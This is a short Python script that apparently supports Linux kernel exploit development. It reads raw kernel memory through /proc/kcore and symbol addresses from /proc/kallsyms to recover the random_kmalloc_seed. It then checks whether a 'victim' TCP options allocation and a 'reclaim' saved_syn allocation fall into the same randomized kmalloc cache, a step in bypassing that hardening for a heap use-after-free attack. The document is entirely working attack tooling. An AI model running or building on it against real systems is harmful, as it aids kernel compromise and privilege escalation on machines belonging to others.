#!/usr/bin/env python3
"""cache_match_fixed.py - corrected RANDOM_KMALLOC_CACHES bucket check.

Uses the kernel's actual hash constant (GOLDEN_RATIO_64 = 0x61C8864680B583EB)
and the runtime kallsyms call-site addresses (not hardcoded link addresses).

victim  : tcp_v4_save_options() inlined at tcp_v4_route_req+0x91
reclaim : struct saved_syn kmalloc at tcp_reqsk_record_syn+0x77
"""
import struct
import sys


def kcore_read(va, n):
    f = open("/proc/kcore", "rb")
    hdr = f.read(64)
    assert hdr[:4] == b"\x7fELF" and hdr[4] == 2
    e_phoff = struct.unpack_from("<Q", hdr, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", hdr, 0x36)[0]
    e_phnum = struct.unpack_from("<H", hdr, 0x38)[0]
    f.seek(e_phoff)
    for _ in range(e_phnum):
        ph = f.read(e_phentsize)
        p_type = struct.unpack_from("<I", ph, 0)[0]
        p_offset, p_vaddr, p_paddr, p_filesz = struct.unpack_from("<QQQQ", ph, 8)
        if p_type == 1 and p_vaddr <= va < p_vaddr + p_filesz:
            f.seek(p_offset + (va - p_vaddr))
            return f.read(n)
    raise SystemExit("VA not mapped")


def main():
    syms = {}
    for line in open("/proc/kallsyms"):
        p = line.split()
        if len(p) >= 3:
            try:
                syms[p[2]] = int(p[0], 16)
            except ValueError:
                pass
    seed = int.from_bytes(kcore_read(syms["random_kmalloc_seed"], 8), "little")
    # Runtime return addresses (kmem tracepoint call_site is the return addr).
    ret_save = syms["tcp_v4_route_req"] + 0x91
    ret_saved = syms["tcp_reqsk_record_syn"] + 0x77
    G = 0x61C8864680B583EB   # kernel GOLDEN_RATIO_64 (include/linux/hash.h)
    M = (1 << 64) - 1

    def idx(c):
        return (((c ^ seed) & M) * G & M) >> 60

    a, b = idx(ret_save), idx(ret_saved)
    print(f"seed=0x{seed:016x} save=0x{ret_save:x} saved=0x{ret_saved:x} "
          f"victim_idx={a} saved_idx={b} {'MATCH' if a == b else 'NOMATCH'}")


if __name__ == "__main__":
    main()
